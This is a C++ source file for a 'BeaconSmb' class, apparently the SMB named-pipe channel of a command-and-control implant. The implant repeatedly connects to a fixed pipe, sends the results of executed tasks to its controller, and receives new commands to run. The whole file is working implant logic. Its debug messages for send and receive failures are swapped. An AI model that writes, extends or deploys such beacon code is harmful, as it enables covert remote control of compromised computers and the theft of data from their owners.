#include "BeaconSmb.hpp"

using namespace std;
using namespace PipeHandler;


BeaconSmb::BeaconSmb(std::string& ip, int port)
	: Beacon(ip, port)
{
	std::string pipeName = "mynamedpipe";
	m_clientSmb = new PipeHandler::Client(pipeName);
}


BeaconSmb::~BeaconSmb()
{
	delete m_clientSmb;
}


void BeaconSmb::checkIn()
{
	DEBUG("initConnection");
	while(!m_clientSmb->initConnection())
	{
		Sleep(333);
		DEBUG("initConnection");
	}

	std::string output;
	taskResultsToCmd(output);

	DEBUG("sending output.size " << std::to_string(output.size()));

	bool res = m_clientSmb->sendData(output);
	if(res)
	{
		string input;
		res=m_clientSmb->receiveData(input);
		if(res)
		{
			DEBUG("received input.size " << std::to_string(input.size()));

			if(!input.empty())
			{
				cmdToTasks(input);
			}
		}
		else
			DEBUG("send failed");
	}
	else
		DEBUG("Receive failed");
}

